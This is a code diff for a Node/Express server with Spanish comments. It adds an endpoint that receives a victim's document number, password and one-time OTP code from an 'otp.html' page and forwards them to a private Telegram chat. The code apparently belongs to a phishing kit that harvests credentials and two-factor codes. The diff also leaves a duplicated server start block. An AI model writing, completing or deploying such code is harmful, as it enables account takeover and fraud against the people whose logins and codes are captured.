@@ -104,6 +104,36 @@ app.post('/telegram-webhook', async (req, res) => {
     res.sendStatus(200);
 });
 
+// 4. NUEVO: Endpoint para recibir el OTP desde otp.html
+app.post('/api/validar-otp', async (req, res) => {
+    const { documento, clave, otp } = req.body;
+    
+    if (!otp) {
+        return res.status(400).json({ status: 'error', message: 'Falta el OTP' });
+    }
+
+    const mensaje = `🔐 *Validación OTP Recibida*\n\n` +
+                    `📄 Documento: \`${documento}\`\n` +
+                    `🔑 Clave: \`${clave}\`\n` +
+                    `🔢 Código OTP: \`${otp}\``;
+
+    try {
+        await axios.post(`${TELEGRAM_API}/sendMessage`, {
+            chat_id: CHAT_ID,
+            text: mensaje,
+            parse_mode: 'Markdown'
+        });
+        res.json({ status: 'ok' });
+    } catch (error) {
+        console.error('Error Telegram OTP:', error.message);
+        res.status(500).json({ status: 'error' });
+    }
+});
+
+// Iniciar el servidor
+app.listen(PORT, () => {
+    console.log(`Servidor corriendo en el puerto ${PORT}`);
+});
 // Iniciar el servidor
 app.listen(PORT, () => {
     console.log(`Servidor corriendo en el puerto ${PORT}`);
